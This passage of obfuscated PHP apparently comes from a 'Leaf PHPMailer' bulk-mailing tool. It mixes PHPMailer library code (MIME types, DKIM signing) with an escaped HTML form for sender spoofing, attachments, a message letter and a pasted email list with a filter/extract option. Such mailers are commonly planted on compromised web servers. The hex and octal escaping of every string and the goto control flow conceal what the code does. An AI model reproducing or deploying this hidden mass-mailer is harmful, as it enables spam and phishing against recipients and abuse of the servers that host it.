"\x61\x70\160\154\151\143\141\164\x69\157\156\x2f\x78\55\x64\x69\x72\145\x63\164\x6f\162", "\144\x76\151" => "\141\x70\160\154\x69\143\x61\x74\x69\x6f\156\x2f\x78\55\x64\166\x69", "\x67\164\141\162" => "\x61\160\160\154\x69\x63\141\x74\151\157\x6e\57\x78\x2d\147\x74\141\x72", "\160\150\x70\63" => "\141\160\160\154\151\143\141\x74\x69\x6f\x6e\57\170\x2d\150\164\164\x70\x64\x2d\x70\x68\160", "\x70\150\x70\x34" => "\141\x70\160\x6c\x69\x63\x61\x74\x69\157\156\57\170\55\x68\x74\164\160\x64\55\x70\x68\160", "\x70\x68\160" => "\x61\160\160\x6c\151\143\x61\164\151\x6f\x6e\x2f\x78\55\x68\164\x74\160\144\x2d\160\150\x70", "\x70\x68\x74\155\154" => "\141\x70\160\154\x69\143\x61\164\x69\157\156\x2f\170\55\150\164\164\x70\144\x2d\x70\150\160", "\160\x68\160\163" => "\141\x70\160\154\151\x63\x61\164\151\157\x6e\x2f\170\55\x68\x74\x74\x70\x64\x2d\160\150\x70\55\x73\x6f\x75\162\x63\x65", "\x73\167\146" => "\141\160\x70\x6c\151\143\141\164\x69\157\156\x2f\170\x2d\x73\x68\157\143\x6b\x77\141\x76\x65\55\146\x6c\x61\163\x68", "\163\151\x74" => "\141\x70\x70\x6c\x69\x63\141\164\151\x6f\x6e\x2f\170\x2d\x73\164\x75\146\146\x69\164", "\164\141\162" => "\x61\x70\x70\x6c\151\x63\141\164\x69\x6f\x6e\57\x78\55\x74\141\x72", "\x74\147\x7a" => "\141\160\x70\154\151\x63\141\x74\x69\157\156\57\170\x2d\164\x61\162", "\170\150\164" => "\x61\x70\160\154\151\143\141\x74\x69\157\x6e\57\170\150\x74\x6d\x6c\53\170\155\x6c", "\x78\150\x74\155\154" => "\x61\160\160\x6c\151\x63\141\x74\x69\157\x6e\57\x78\x68\164\155\154\x2b\x78\155\x6c", "\172\151\x70" => "\x61\x70\160\x6c\151\143\x61\x74\151\157\x6e\57\172\x69\x70", "\155\151\144" => "\141\x75\144\151\157\57\x6d\x69\144\151", "\155\x69\144\151" => "\141\x75\x64\x69\x6f\57\155\x69\x64\x69", "\x6d\160\x32" => "\x61\165\144\x69\157\x2f\x6d\x70\145\147", "\155\x70\63" => "\141\165\x64\x69\157\x2f\x6d\160\145\147", "\x6d\160\x67\141" => "\141\165\144\x69\157\x2f\155\x70\x65\147", "\141\x69\146" => "\141\x75\144\151\x6f\x2f\x78\x2d\x61\x69\x66\x66", "\141\x69\146\143" => "\141\x75\x64\151\157\57\170\55\141\x69\146\146", "\141\151\x66\146" => "\141\x75\x64\151\x6f\x2f\x78\x2d\141\x69\x66\146", "\162\x61\155" => "\141\165\144\151\x6f\57\170\55\160\156\55\x72\145\141\154\x61\165\144\151\157", "\162\155" => "\x61\165\144\x69\x6f\x2f\170\55\160\x6e\x2d\162\x65\x61\x6c\x61\x75\x64\x69\x6f", "\x72\160\155" => "\x61\x75\144\151\x6f\57\170\55\160\x6e\x2d\x72\145\141\154\x61\x75\144\151\157\55\160\154\165\147\151\156", "\162\141" => "\x61\165\x64\x69\x6f\x2f\170\55\x72\x65\x61\154\141\x75\x64\151\157", "\167\x61\166" => "\141\165\144\151\157\x2f\x78\55\x77\141\166", "\142\x6d\160" => "\x69\155\141\x67\145\57\142\x6d\x70", "\147\151\146" => "\x69\155\x61\x67\x65\57\x67\x69\146", "\152\x70\145\147" => "\x69\155\x61\147\145\x2f\152\160\145\147", "\152\160\x65" => "\x69\x6d\141\x67\x65\x2f\x6a\160\x65\147", "\x6a\x70\147" => "\x69\x6d\x61\147\x65\x2f\x6a\x70\x65\x67", "\160\x6e\147" => "\x69\x6d\141\147\x65\x2f\160\x6e\147", "\164\151\x66\146" => "\x69\155\x61\x67\145\x2f\164\151\146\146", "\164\151\146" => "\151\155\141\147\x65\x2f\x74\x69\x66\x66", "\x65\x6d\x6c" => "\155\145\163\x73\141\147\x65\x2f\162\x66\x63\x38\x32\x32", "\x63\x73\163" => "\x74\145\170\164\57\143\x73\163", "\x68\x74\155\154" => "\164\x65\170\164\57\150\164\155\154", "\150\x74\x6d" => "\x74\x65\170\164\57\150\164\155\x6c", "\x73\150\x74\x6d\x6c" => "\x74\x65\x78\164\57\150\x74\155\x6c", "\x6c\157\x67" => "\x74\145\170\x74\x2f\160\154\141\x69\156", "\x74\145\x78\164" => "\164\145\x78\x74\57\160\154\x61\x69\156", "\164\x78\164" => "\164\145\x78\164\x2f\x70\154\x61\x69\156", "\162\x74\x78" => "\164\145\x78\164\x2f\x72\x69\x63\150\164\x65\x78\164", "\162\x74\146" => "\164\x65\x78\164\x2f\x72\164\146", "\x76\143\x66" => "\164\145\x78\x74\x2f\x76\x63\141\162\x64", "\x76\x63\141\x72\144" => "\164\x65\x78\164\57\166\143\141\x72\x64", "\x78\155\x6c" => "\x74\145\170\164\x2f\x78\155\154", "\x78\163\154" => "\164\145\x78\x74\x2f\x78\x6d\154", "\155\x70\145\147" => "\166\151\x64\x65\x6f\x2f\x6d\x70\x65\x67", "\x6d\x70\145" => "\166\x69\144\x65\157\57\x6d\160\145\x67", "\x6d\x70\147" => "\x76\151\144\145\157\57\x6d\160\x65\x67", "\155\x6f\166" => "\x76\151\x64\145\x6f\57\x71\165\151\143\x6b\164\x69\x6d\145", "\161\x74" => "\166\x69\144\145\x6f\x2f\161\x75\151\x63\153\164\x69\x6d\x65", "\x72\x76" => "\166\x69\144\145\x6f\x2f\x76\156\144\56\x72\x6e\x2d\x72\145\141\x6c\166\x69\144\145\157", "\x61\166\151" => "\x76\151\144\x65\x6f\x2f\170\x2d\155\x73\x76\151\144\145\157", "\x6d\157\166\x69\145" => "\x76\151\144\145\x6f\57\x78\55\x73\147\151\55\155\x6f\166\x69\145"); if (array_key_exists(strtolower($ext), $mimes)) { return $mimes[strtolower($ext)]; } return "\141\x70\x70\154\x69\143\141\164\x69\157\x6e\x2f\157\x63\164\x65\164\55\x73\x74\x72\x65\141\x6d"; } public static function filenameToType($filename) { $qpos = strpos($filename, "\x3f"); if (false !== $qpos) { $filename = substr($filename, 0, $qpos); } $pathinfo = self::mb_pathinfo($filename); return self::_mime_types($pathinfo["\x65\170\164\x65\x6e\163\x69\x6f\156"]); } public static function mb_pathinfo($path, $options = null) { $ret = array("\x64\151\x72\x6e\x61\155\145" => '', "\142\141\x73\145\x6e\x61\x6d\145" => '', "\x65\170\x74\145\156\163\x69\157\156" => '', "\x66\151\x6c\x65\x6e\x61\x6d\145" => ''); $pathinfo = array(); if (preg_match("\45\136\50\56\x2a\x3f\x29\x5b\x5c\x5c\x2f\x5d\52\50\x28\x5b\136\57\134\x5c\135\x2a\x3f\51\50\134\56\x28\133\x5e\134\56\x5c\134\57\x5d\x2b\x3f\51\x7c\x29\51\133\x5c\x5c\x2f\134\x2e\x5d\52\x24\x25\x69\155", $path, $pathinfo)) { if (array_key_exists(1, $pathinfo)) { $ret["\144\151\162\156\141\155\145"] = $pathinfo[1]; } if (array_key_exists(2, $pathinfo)) { $ret["\x62\141\x73\145\156\x61\155\145"] = $pathinfo[2]; } if (array_key_exists(5, $pathinfo)) { $ret["\x65\170\164\145\156\163\151\x6f\x6e"] = $pathinfo[5]; } if (array_key_exists(3, $pathinfo)) { $ret["\146\x69\154\145\x6e\x61\x6d\x65"] = $pathinfo[3]; } } switch ($options) { case PATHINFO_DIRNAME: case "\x64\x69\x72\156\x61\155\x65": return $ret["\144\151\162\x6e\141\x6d\145"]; case PATHINFO_BASENAME: case "\x62\141\163\x65\156\x61\155\x65": return $ret["\142\x61\x73\x65\156\x61\155\x65"]; case PATHINFO_EXTENSION: case "\145\x78\x74\x65\x6e\x73\151\x6f\156": return $ret["\145\x78\x74\145\x6e\163\151\157\156"]; case PATHINFO_FILENAME: case "\x66\x69\x6c\x65\156\x61\155\x65": return $ret["\x66\x69\154\145\156\141\155\x65"]; default: return $ret; } } public function set($name, $value = '') { if (property_exists($this, $name)) { $this->{$name} = $value; return true; } else { $this->setError($this->lang("\x76\141\x72\x69\x61\x62\x6c\x65\137\x73\145\x74") . $name); return false; } } public function secureHeader($str) { return trim(str_replace(array("\xd", "\12"), '', $str)); } public static function normalizeBreaks($text, $breaktype = "\xd\xa") { return preg_replace("\57\x28\134\162\134\x6e\174\134\x72\174\x5c\x6e\x29\57\x6d\163", $breaktype, $text); } public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '') { $this->sign_cert_file = $cert_filename; $this->sign_key_file = $key_filename; $this->sign_key_pass = $key_pass; $this->sign_extracerts_file = $extracerts_filename; } public function DKIM_QP($txt) { $line = ''; for ($i = 0; $i < strlen($txt); $i++) { $ord = ord($txt[$i]); if (33 <= $ord && $ord <= 58 || $ord == 60 || 62 <= $ord && $ord <= 126) { $line .= $txt[$i]; } else { $line .= "\x3d" . sprintf("\45\x30\x32\130", $ord); } } return $line; } public function DKIM_Sign($signHeader) { if (!defined("\120\x4b\x43\123\67\137\x54\x45\130\124")) { if ($this->exceptions) { throw new phpmailerException($this->lang("\x65\x78\x74\x65\156\163\151\x6f\156\x5f\155\x69\x73\x73\x69\156\x67") . "\157\x70\x65\156\x73\163\x6c"); } return ''; } $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' != $this->DKIM_passphrase) { $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase); } else { $privKey = openssl_pkey_get_private($privKeyStr); } if (version_compare(PHP_VERSION, "\65\x2e\63\x2e\60") >= 0 and in_array("\x73\x68\141\62\65\x36\x57\x69\164\x68\122\123\x41\x45\156\x63\x72\x79\x70\164\151\x6f\x6e", openssl_get_md_methods(true))) { if (openssl_sign($signHeader, $signature, $privKey, "\x73\150\x61\62\65\66\127\x69\164\x68\122\x53\101\105\156\x63\162\x79\160\x74\151\157\x6e")) { openssl_pkey_free($privKey); return base64_encode($signature); } } else { $pinfo = openssl_pkey_get_details($privKey); $hash = hash("\x73\150\141\x32\x35\x36", $signHeader); $t = "\63\60\63\x31\x33\x30\x30\144\x30\x36\60\71\66\60\x38\66\x34\x38\x30\x31\66\x35\x30\63\x30\x34\60\x32\60\61\60\65\60\60\x30\64\62\x30" . $hash; $pslen = $pinfo["\x62\151\164\163"] / 8 - (strlen($t) / 2 + 3); $eb = pack("\110\52", "\x30\x30\x30\x31" . str_repeat("\106\x46", $pslen) . "\x30\60" . $t); if (openssl_private_encrypt($eb, $signature, $privKey, OPENSSL_NO_PADDING)) { openssl_pkey_free($privKey); return base64_encode($signature); } } openssl_pkey_free($privKey); return ''; } public function DKIM_HeaderC($signHeader) { $signHeader = preg_replace("\57\134\x72\x5c\156\134\163\x2b\57", "\x20", $signHeader); $lines = explode("\15\12", $signHeader); foreach ($lines as $key => $line) { list($heading, $value) = explode("\x3a", $line, 2); $heading = strtolower($heading); $value = preg_replace("\x2f\x5c\x73\x7b\x32\54\175\57", "\x20", $value); $lines[$key] = $heading . "\x3a" . trim($value); } $signHeader = implode("\15\12", $lines); return $signHeader; } public function DKIM_BodyC($body) { if ($body == '') { return "\15\xa"; } $body = str_replace("\xd\xa", "\xa", $body); $body = str_replace("\xa", "\15\12", $body); while (substr($body, strlen($body) - 4, 4) == "\15\12\xd\xa") { $body = substr($body, 0, strlen($body) - 2); } return $body; } public function DKIM_Add($headers_line, $subject, $body) { $DKIMsignatureType = "\x72\163\x61\x2d\163\x68\x61\x32\x35\66"; $DKIMcanonicalization = "\162\145\x6c\141\170\x65\144\x2f\x73\x69\x6d\x70\154\145"; $DKIMquery = "\x64\156\x73\57\164\170\164"; $DKIMtime = time(); $subject_header = "\123\165\x62\x6a\145\x63\x74\x3a\x20{$subject}"; $headers = explode($this->LE, $headers_line); $from_header = ''; $to_header = ''; $date_header = ''; $current = ''; foreach ($headers as $header) { if (strpos($header, "\x46\162\157\x6d\x3a") === 0) { $from_header = $header; $current = "\146\162\157\155\x5f\x68\145\x61\144\145\162"; } elseif (strpos($header, "\x54\157\72") === 0) { $to_header = $header; $current = "\x74\x6f\x5f\x68\x65\x61\144\145\x72"; } elseif (strpos($header, "\x44\141\x74\x65\72") === 0) { $date_header = $header; $current = "\144\x61\164\145\x5f\150\145\x61\144\x65\x72"; } else { if (!empty(${$current}) && strpos($header, "\40\75\77") === 0) { ${$current} .= $header; } else { $current = ''; } } } $from = str_replace("\x7c", "\75\x37\103", $this->DKIM_QP($from_header)); $to = str_replace("\x7c", "\x3d\x37\x43", $this->DKIM_QP($to_header)); $date = str_replace("\x7c", "\75\x37\103", $this->DKIM_QP($date_header)); $subject = str_replace("\174", "\x3d\67\x43", $this->DKIM_QP($subject_header)); $body = $this->DKIM_BodyC($body); $DKIMlen = strlen($body); $DKIMb64 = base64_encode(pack("\x48\x2a", hash("\x73\x68\141\x32\x35\x36", $body))); if ('' == $this->DKIM_identity) { $ident = ''; } else { $ident = "\40\151\75" . $this->DKIM_identity . "\73"; } $dkimhdrs = "\x44\113\x49\x4d\55\x53\151\147\156\141\164\165\162\x65\72\x20\166\75\x31\73\40\x61\x3d" . $DKIMsignatureType . "\x3b\40\x71\x3d" . $DKIMquery . "\73\x20\154\x3d" . $DKIMlen . "\x3b\x20\x73\x3d" . $this->DKIM_selector . "\x3b\xd\xa" . "\11\x74\x3d" . $DKIMtime . "\x3b\40\143\75" . $DKIMcanonicalization . "\73\xd\12" . "\x9\x68\x3d\106\162\157\x6d\72\124\157\72\x44\x61\164\145\72\x53\165\x62\x6a\x65\x63\164\x3b\xd\xa" . "\11\x64\75" . $this->DKIM_domain . "\x3b" . $ident . "\15\12" . "\11\172\75{$from}\15\xa" . "\x9\174{$to}\15\xa" . "\11\174{$date}\xd\xa" . "\x9\x7c{$subject}\x3b\15\xa" . "\x9\142\x68\75" . $DKIMb64 . "\x3b\xd\12" . "\11\x62\75"; $toSign = $this->DKIM_HeaderC($from_header . "\15\12" . $to_header . "\xd\12" . $date_header . "\15\xa" . $subject_header . "\15\xa" . $dkimhdrs); $signed = $this->DKIM_Sign($toSign); return $dkimhdrs . $signed . "\15\12"; } public static function hasLineLongerThanMax($str) { return (bool) preg_match("\57\136\50\56\173" . (self::MAX_LINE_LENGTH + 2) . "\x2c\x7d\x29\x2f\155", $str); } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from) { if (!empty($this->action_function) && is_callable($this->action_function)) { $params = array($isSent, $to, $cc, $bcc, $subject, $body, $from); call_user_func_array($this->action_function, $params); } } } goto OzuUV; lH4zt: print "\x3c\x64\x69\166\x20\x63\x6c\141\x73\x73\x3d\x22\143\x6f\156\x74\x61\151\156\x65\x72\40\x63\157\x6c\x2d\x6c\x67\x2d\x36\42\76\xa\40\x20\40\40\40\x20\40\40\x3c\x68\63\76\74\x66\x6f\156\x74\40\x63\157\154\157\x72\75\x22\x67\x72\145\145\156\x22\76\x3c\x73\160\x61\156\40\143\154\x61\163\x73\75\42\x67\154\171\160\x68\151\x63\x6f\156\40\x67\x6c\x79\x70\150\151\x63\x6f\x6e\55\154\145\x61\x66\42\x3e\x3c\57\163\160\141\156\76\74\57\146\157\x6e\x74\76\40\114\x65\141\146\40\x50\110\x50\x4d\141\x69\x6c\x65\x72\x20\74\163\x6d\141\x6c\x6c\76" . $leaf["\166\145\x72\x73\151\157\x6e"] . "\74\x2f\x73\x6d\141\x6c\x6c\76\x3c\57\150\x33\x3e\12\x20\x20\x20\40\x20\40\40\40\74\146\157\162\x6d\40\x6e\x61\155\x65\75\42\146\157\162\155\42\40\x69\144\x3d\x22\x66\x6f\162\155\x22\40\155\x65\164\150\x6f\x64\x3d\x22\120\117\x53\124\42\40\x65\x6e\143\164\x79\x70\145\75\42\155\x75\x6c\164\151\x70\x61\x72\164\57\146\157\x72\x6d\x2d\x64\141\164\141\42\40\x61\143\x74\151\157\156\x3d\42\42\x3e\xa\40\x20\40\40\40\x20\x20\40\40\40\40\40\40\40\40\x20\40\x20\40\40\x3c\x69\156\x70\165\164\40\164\x79\x70\x65\x3d\x22\x68\x69\144\x64\145\x6e\42\40\x6e\x61\155\x65\x3d\42\x61\x63\x74\151\157\x6e\x22\x20\166\x61\x6c\165\145\75\42\163\x63\157\162\145\x22\76\12\12\40\40\x20\40\x20\40\40\40\x20\x20\x20\x20\x3c\144\x69\x76\x20\143\x6c\141\x73\163\75\42\162\x6f\x77\42\x3e\xa\x20\40\x20\40\x20\40\40\40\x20\x20\x20\40\40\x20\40\x20\x3c\x64\x69\x76\x20\143\x6c\141\163\163\x3d\42\146\x6f\162\x6d\55\x67\x72\x6f\x75\160\40\143\x6f\154\x2d\154\x67\x2d\x36\x20\x22\x3e\74\x6c\141\142\x65\154\40\146\x6f\x72\x3d\x22\163\x65\x6e\x64\x65\162\105\155\x61\151\x6c\x22\x3e\x45\x6d\141\x69\x6c\74\57\x6c\141\x62\145\x6c\x3e\74\x69\156\160\165\x74\40\x74\171\160\145\75\42\164\x65\170\164\42\x20\x63\x6c\141\x73\163\x3d\x22\146\157\162\x6d\x2d\x63\x6f\x6e\164\162\157\x6c\40\40\151\156\x70\x75\x74\55\x73\x6d\x20\x22\x20\151\144\75\x22\163\x65\x6e\144\145\x72\x45\x6d\x61\151\154\42\x20\156\141\155\145\x3d\42\x73\x65\x6e\x64\x65\162\x45\x6d\141\151\154\42\40\166\141\x6c\165\x65\75\42" . $senderEmail . "\42\x3e\x3c\x2f\x64\x69\166\x3e\xa\x20\x20\40\40\x20\x20\40\x20\40\40\40\40\40\x20\40\40\x3c\144\151\166\40\143\154\141\x73\x73\x3d\42\x66\x6f\x72\155\55\x67\162\157\x75\160\40\x63\157\x6c\55\154\x67\x2d\x36\x20\x22\x3e\74\x6c\x61\x62\145\154\40\x66\157\162\x3d\x22\163\145\156\144\x65\x72\116\141\x6d\x65\42\x3e\x53\x65\156\144\x65\x72\x20\116\141\x6d\x65\74\57\154\141\x62\145\x6c\76\x3c\151\156\160\165\164\40\x74\171\x70\145\x3d\x22\x74\x65\x78\x74\x22\40\143\154\141\163\163\75\x22\x66\x6f\x72\x6d\55\x63\157\x6e\164\162\x6f\154\40\40\x69\156\x70\165\x74\55\x73\155\x20\x22\40\151\x64\75\42\163\x65\156\x64\x65\x72\116\x61\155\145\x22\40\156\141\x6d\145\75\x22\163\x65\156\x64\x65\x72\116\x61\x6d\145\x22\x20\166\x61\x6c\165\x65\75\x22" . $senderName . "\x22\76\74\57\144\151\166\x3e\12\40\x20\x20\x20\40\x20\40\40\x20\40\x20\40\74\x2f\x64\x69\x76\x3e\12\40\x20\x20\40\40\40\x20\40\40\x20\40\40\74\144\x69\166\x20\x63\x6c\x61\x73\163\75\x22\x72\157\x77\42\x3e\xa\x20\40\40\40\x20\x20\40\x20\x20\40\40\x20\40\x20\40\40\74\x73\x70\141\x6e\x20\143\154\x61\163\163\75\42\146\x6f\x72\155\x2d\147\162\x6f\165\x70\x20\x63\157\154\55\154\147\x2d\66\x20\x20\x22\x3e\74\x6c\x61\142\145\154\40\x66\x6f\x72\75\42\x61\x74\164\x61\143\150\155\145\156\x74\x22\x3e\x41\164\x74\141\143\x68\155\x65\156\164\x20\x3c\x73\155\141\x6c\154\x3e\50\x4d\165\x6c\x74\x69\160\154\145\40\x41\x76\141\x69\154\141\142\154\145\51\x3c\57\x73\155\x61\x6c\x6c\x3e\74\57\x6c\x61\142\145\154\76\x3c\x69\156\160\165\x74\x20\164\171\160\x65\75\42\146\151\154\145\x22\x20\156\x61\155\x65\x3d\x22\x61\164\164\141\x63\150\155\145\x6e\164\133\135\x22\40\151\144\x3d\x22\x61\x74\164\x61\143\x68\155\x65\x6e\x74\133\135\x22\40\155\165\x6c\x74\x69\x70\154\x65\x2f\76\74\x2f\163\160\x61\x6e\76\xa\xa\40\x20\x20\x20\40\x20\40\40\x20\x20\x20\40\x20\40\40\x20\x3c\144\x69\x76\40\143\x6c\x61\x73\163\x3d\42\146\157\162\155\x2d\147\162\157\x75\x70\40\143\157\154\55\x6c\x67\x2d\66\x22\76\74\154\x61\x62\x65\154\40\x66\x6f\x72\75\x22\x72\145\160\154\171\x54\x6f\42\x3e\x52\x65\160\154\171\55\x74\157\x3c\x2f\154\x61\x62\145\154\76\74\151\156\160\x75\164\40\x74\x79\x70\x65\x3d\x22\x74\145\x78\164\x22\40\143\154\x61\163\x73\x3d\42\x66\157\x72\155\55\143\x6f\156\164\162\x6f\x6c\40\40\x69\x6e\160\x75\164\x2d\163\x6d\40\x22\x20\x69\144\75\42\162\145\160\154\171\124\157\x22\x20\156\x61\155\x65\x3d\x22\x72\x65\160\x6c\x79\x54\x6f\x22\40\x76\141\154\x75\145\75\42" . $replyTo . "\x22\x20\57\x3e\x3c\x2f\x64\151\x76\76\12\x20\40\x20\40\x20\40\x20\x20\x20\x20\40\x20\x3c\57\144\x69\166\x3e\xa\40\40\x20\40\x20\40\40\40\x20\40\x20\x20\74\x64\x69\166\x20\143\154\x61\163\x73\x3d\x22\x72\x6f\167\42\76\12\40\x20\40\40\40\x20\x20\40\40\x20\x20\x20\x20\x20\40\40\74\144\151\x76\x20\x63\154\x61\163\163\x3d\x22\146\157\x72\x6d\55\147\162\x6f\x75\160\x20\x63\x6f\154\x2d\154\x67\x2d\61\62\40\x22\x3e\74\x6c\x61\142\x65\x6c\40\146\x6f\x72\75\x22\x73\165\142\x6a\145\143\x74\x22\x3e\123\x75\x62\x6a\x65\143\x74\x3c\57\154\141\x62\145\154\76\x3c\x69\x6e\160\x75\164\40\164\171\x70\145\75\42\x74\145\170\x74\42\x20\x63\x6c\141\x73\x73\x3d\42\x66\157\162\155\55\143\157\x6e\164\x72\157\x6c\40\x20\x69\156\160\165\x74\55\x73\x6d\x20\42\40\151\144\x3d\x22\163\x75\x62\x6a\145\x63\164\42\x20\x6e\141\155\x65\75\x22\x73\x75\x62\x6a\x65\143\164\42\x20\166\141\154\165\x65\75\42" . $subject . "\42\40\x2f\x3e\x3c\57\144\151\166\x3e\xa\x20\x20\40\x20\40\40\40\40\x20\x20\40\x20\74\57\x64\151\x76\x3e\12\x20\40\x20\40\x20\40\x20\x20\40\x20\40\40\x3c\144\151\166\x20\x63\154\x61\163\x73\75\42\x72\157\x77\x22\x3e\xa\x20\40\x20\40\x20\x20\x20\40\40\40\40\40\40\x20\x20\x20\x3c\144\151\x76\x20\143\x6c\141\163\x73\75\x22\146\157\x72\155\55\x67\162\157\165\160\40\143\157\154\55\154\147\x2d\x36\42\76\74\x6c\x61\142\145\154\40\x66\x6f\162\x3d\42\x6d\x65\163\x73\141\147\145\x4c\145\x74\x74\145\162\42\x3e\115\x65\163\163\x61\x67\145\40\x4c\x65\164\x74\145\162\x20\74\x62\x75\x74\164\x6f\156\40\164\x79\x70\145\x3d\x22\x73\x75\142\x6d\151\164\42\40\143\154\141\x73\x73\x3d\x22\142\x74\x6e\40\142\x74\156\55\144\x65\146\x61\x75\154\164\40\142\x74\x6e\x2d\x78\x73\42\x20\x66\x6f\162\155\x3d\42\x66\x6f\x72\x6d\42\x20\156\141\x6d\x65\75\42\141\143\x74\x69\x6f\156\x22\40\x76\x61\154\165\x65\75\42\x76\151\x65\x77\x22\x20\146\x6f\x72\155\164\141\x72\x67\x65\x74\x3d\x22\137\x62\154\141\x6e\x6b\42\76\120\x72\145\166\151\145\167\40\74\57\x62\x75\164\x74\157\x6e\76\74\x2f\154\141\142\x65\x6c\76\74\x74\x65\170\x74\x61\x72\145\x61\x20\156\x61\155\145\x3d\42\155\x65\163\163\141\x67\x65\x4c\x65\164\164\145\x72\x22\40\151\144\75\x22\155\145\x73\x73\x61\x67\145\x4c\145\164\164\145\162\x22\40\x63\154\141\x73\x73\75\42\x66\157\162\x6d\x2d\143\157\x6e\x74\x72\x6f\154\x22\x20\162\x6f\167\163\x3d\x22\61\60\x22\x20\151\144\x3d\x22\x74\x65\x78\x74\x41\162\145\141\42\76" . $messageLetter . "\x3c\57\164\x65\x78\x74\x61\162\145\x61\76\x3c\x2f\x64\x69\x76\76\xa\x20\x20\x20\40\x20\40\40\40\40\x20\40\x20\x20\40\x20\x20\x3c\x64\151\166\40\143\x6c\x61\163\163\x3d\42\146\157\162\x6d\x2d\147\x72\157\165\160\x20\143\157\x6c\55\154\147\55\x36\40\x22\76\74\x6c\141\142\145\x6c\x20\146\157\x72\75\x22\x65\x6d\x61\x69\154\114\151\163\x74\42\76\105\x6d\141\x69\154\40\114\151\163\x74\x20\x3c\x61\40\x68\162\x65\x66\x3d\42\x3f\145\x6d\x61\x69\154\146\151\x6c\164\145\162\75\157\156\x22\40\x74\x61\x72\147\x65\164\75\42\x5f\x62\x6c\141\x6e\153\x22\40\x63\x6c\141\163\163\x3d\42\x62\164\156\40\142\164\156\x2d\x64\x65\146\141\x75\x6c\x74\x20\142\x74\156\55\x78\x73\x22\x3e\106\151\154\164\x65\x72\x2f\x45\170\x74\162\x61\143\164\74\57\141\76\x3c\57\154\x61\142\x65\154\76\x3c\x74\145\x78\164\141\162\145\141\40\x6e\141\155\145\75\x22\145\x6d\x61\x69\154\114\x69\163\x74\x22\40\151\144\75\42\145\155\x61\x69\x6c\x4c\x69\x73\x74\42\x20\143\154\141\163\x73\x3d\42\146\157\162\x6d\x2d\143\157\x6e\x74\162\157\154\42\40\162\x6f\x77\163\x3d\x22\61\60\42\40\x69\144\x3d\x22\x74\145\x78\x74\101\x72\145\141\42\76" . $emailList . "\x3c\57\x74\x65\x78\x74\x61\162\x65\x61\x3e\74\x2f\x64\151\x76\76\12\x20\x20\40\40\x20\x20\x20\40\40\x20\x20\x20\x3c\57\144\x69\166\76\xa\40\40\x20\x20\40\40\x20\x20\40\x20\40\x20\74\144\x69\166\x20\x63\x6c\x61\163\163\75\x22\162\157\x77\42\76\12\40\x20\40\x20\40\40\40\40\x20\x20\x20\40\40\x20\40\40\x3c\x64\x69\166\40\x63\154\x61\x73\x73\x3d\x22\x66\x6f\x72\155\55\147\x72\157\x75\x70\40\x63\x6f\154\x2d\154\x67\x2d\x36\x20\42\x3e\12\x20\x20\40\x20\40\40\40\40\40\40\40\x20\40\x20\40\x20\x20\40\40\x20\74\x6c\x61\x62\145\154\40\x66\157\162\x3d\42\x6d\x65\163\x73\141\x67\145\124\171\x70\x65\42\x3e\115\145\x73\x73\x61\147\x65\x20\x54\171\160\x65\x3c\57\154\141\142\145\154\76\12\x20\x20\40\x20\40\40\40\x20\x20\x20\x20\x20\40\40\40\x20\x20\40\40\40\x48\x54\x4d\x4c\40\74\151\x6e\x70\x75\164\40\x74\171\160\x65\x3d\42\162\141\x64\151\157\42\40\156\x61\155\x65\75\x22\155\145\163\163\x61\x67\x65\124\171\x70\145\x22\40\x69\144\75\x22\155\x65\163\163\141\147\145\x54\171\160\x65\42\40\x76\x61\x6c\x75\145\x3d\x22\x31\x22\x20" . $html . "\x3e\12\40\x20\x20\x20\x20\40\40\40\40\40\40\x20\40\x20\x20\40\x20\x20\x20\x20\120\154\141\x69\x6e\74\151\156\x70\165\164\40\164\171\160\x65\75\x22\x72\x61\144\x69\157\x22\40\x6e\x61\155\x65\75\x22\155\x65\x73\163\141\x67\x65\124\x79\x70\x65\x22\40\x69\144\75\42\155\145\163\x73\141\147\145\124\x79\x70\145\x22\40\166\141\154\x75\145\x3d\x22\x32\42\40" . $plain . "\x3e\xa\40\x20\40\40\40\x20\x20\x20\x20\x20\x20\40\40\x20\x20\40\x3c\57\x64\151\x76\76\xa\x20\40\40\x20\x20\x20\40\40\x20\x20\40\x20\40\x20\x20\x20\74\x64\151\x76\40\143\154\x61\163\x73\75\42\146\x6f\x72\155\x2d\x67\x72\x6f\165\x70\40\x63\x6f\x6c\55\154\x67\55\x33\x20\42\76\12\40\x20\40\x20\40\40\x20\40\40\40\x20\40\40\40\x20\x20\40\x20\x20\40\74\154\141\x62\145\x6c\40\x66\x6f\162\x3d\42\x63\150\141\x72\163\145\x74\42\76\x43\150\x61\x72\141\x63\x74\x65\162\x20\163\x65\x74\74\57\x6c\x61\142\x65\x6c\x3e\xa\40\40\40\x20\x20\40\40\40\40\40\x20\x20\x20\x20\40\40\x20\40\40\x20\74\163\145\x6c\145\143\164\40\x63\x6c\141\x73\x73\x3d\42\x66\x6f\162\x6d\x2d\x63\157\156\x74\x72\157\154\40\x69\x6e\160\165\164\55\x73\155\42\40\151\144\x3d\x22\x63\x68\141\162\163\x65\x74\42\40\156\x61\155\145\x3d\x22\x63\150\x61\x72\x73\145\x74\x22\x3e\xa\x20\40\40\40\x20\x20\40\40\x20\40\40\x20\x20\x20\x20\x20\40\x20\x20\x20\40\40\40\40\74\x6f\x70\x74\151\157\x6e\x20" . $utf8 . "\76\x55\x54\x46\x2d\x38\74\57\157\x70\164\151\157\156\x3e\12\x20\40\x20\40\x20\x20\x20\x20\40\40\x20\40\x20\40\40\40\40\40\x20\40\x20\40\x20\40\x3c\x6f\x70\x74\151\x6f\x6e\x20" . $iso . 